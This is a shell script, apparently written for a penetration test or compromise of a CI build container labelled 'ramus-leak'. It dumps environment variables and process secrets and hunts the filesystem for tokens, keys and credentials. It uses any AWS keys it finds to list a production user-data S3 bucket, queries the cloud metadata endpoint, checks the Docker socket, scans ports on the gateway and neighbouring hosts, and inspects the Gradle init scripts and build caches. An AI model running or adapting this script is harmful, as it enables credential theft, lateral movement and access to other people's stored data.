#!/bin/sh
echo "=== marker ramus-leak $(date -u) ==="
id; hostname; uname -a
echo "=== env ==="; env | sort
echo "=== ps ==="; ps aux 2>/dev/null | head -80
echo "=== net ==="; ip addr 2>/dev/null; ip route 2>/dev/null; cat /etc/hosts
echo "=== proc1 ==="; tr '\0' ' ' < /proc/1/cmdline; echo; tr '\0' '\n' < /proc/1/environ 2>/dev/null | head -40
echo "=== fs ==="; ls -la / /root /home 2>/dev/null; ls -la /dev 2>/dev/null | head -40
echo "=== creds ==="; find / -maxdepth 4 \( -iname '*token*' -o -iname '*.pem' -o -iname '*credential*' -o -iname '.aws' \) 2>/dev/null | head -40
echo "=== aws env ==="; env | grep -i -E 'aws|s3|bucket' 
if [ -n "$AWS_SECRET_ACCESS_KEY" ]; then
  echo "=== s3 list ==="
  if [ -n "$AWS_SESSION_TOKEN" ]; then
    curl -s --aws-sigv4 "aws:amz:us-east-va:s3" --user "$AWS_ACCESS_KEY_ID:$AWS_SECRET_ACCESS_KEY" -H "x-amz-security-token: $AWS_SESSION_TOKEN" "https://ramus-prod-user-data.s3.us-east-va.io.cloud.ovh.us/?list-type=2&max-keys=25"
  else
    curl -s --aws-sigv4 "aws:amz:us-east-va:s3" --user "$AWS_ACCESS_KEY_ID:$AWS_SECRET_ACCESS_KEY" "https://ramus-prod-user-data.s3.us-east-va.io.cloud.ovh.us/?list-type=2&max-keys=25"
  fi
fi
echo "=== end ==="
echo "=== mounts ==="; cat /proc/self/mountinfo 2>/dev/null | head -30
echo "=== cache ==="; ls -la /cache 2>/dev/null; du -sh /cache/* 2>/dev/null
echo "=== cache-gradle ==="; ls -la /cache/gradle 2>/dev/null; ls -la /cache/gradle/caches 2>/dev/null | head -30
echo "=== buildcache ==="; ls -la /cache/gradle/caches/build-cache-1 2>/dev/null | head -15
echo "=== npm ==="; ls /cache/npm 2>/dev/null; ls /cache/npm/_cacache 2>/dev/null
echo "=== tmp ==="; ls -la /tmp 2>/dev/null; find /tmp -maxdepth 2 2>/dev/null | head -30
echo "=== sockets ==="; ls -la /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock 2>/dev/null
echo "=== bins ==="; which nc curl python3 aws ssh 2>/dev/null
echo "=== metadata ==="; curl -s -m 3 http://169.254.169.254/latest/meta-data/ 2>&1 | head -5; curl -s -m 3 http://172.16.0.1/ 2>&1 | head -5
echo "=== gw ports ==="; for p in 22 80 443 2375 2376 3000 3001 5000 8000 8080 8443 9090 9091 5432 6379 27017; do nc -z -w1 172.16.0.1 $p 2>/dev/null && echo "OPEN $p"; done
echo "=== neighbors ==="; for i in 1 2 3 4 5 6 7 8; do for p in 22 80 443 2375 8080; do nc -z -w1 172.16.0.$i $p 2>/dev/null && echo "172.16.0.$i:$p"; done; done
echo "=== end2 ==="
echo "=== pentest files ==="; cat /cache/PENTEST_MARKER 2>/dev/null; echo; cat /cache/PENTEST_LOG 2>/dev/null
echo "=== pwn ==="; find /cache/pwn -maxdepth 4 2>/dev/null | head -40; ls -laR /cache/pwn 2>/dev/null | head -40
echo "=== initd ==="; ls -la /cache/gradle/init.d 2>/dev/null; cat /cache/gradle/init.d/* 2>/dev/null | head -40
echo "=== jars9 ==="; ls -la /cache/gradle/caches/jars-9 2>/dev/null | head -20; find /cache/gradle/caches/jars-9 -maxdepth 3 -type f 2>/dev/null | head -10
echo "=== deps ==="; ls /cache/gradle/caches/modules-2/files-2.1 2>/dev/null | head -40
echo "=== who wrote ==="; stat -c '%n %U %G %a %y' /cache /cache/gradle /cache/PENTEST_LOG /cache/pr14.apk 2>/dev/null
echo "=== net2 ==="; for p in 22 80 443 2375 3000 5000 8080 9090; do curl -s -m1 -o /dev/null "http://172.16.0.1:$p/" && echo "GW $p http"; done; command -v bash && bash -c 'for p in 22 2375 2376 5000 8080 9090; do timeout 1 bash -c "echo >/dev/tcp/172.16.0.1/$p" 2>/dev/null && echo "GW-TCP $p"; done'
echo "=== end3 ==="
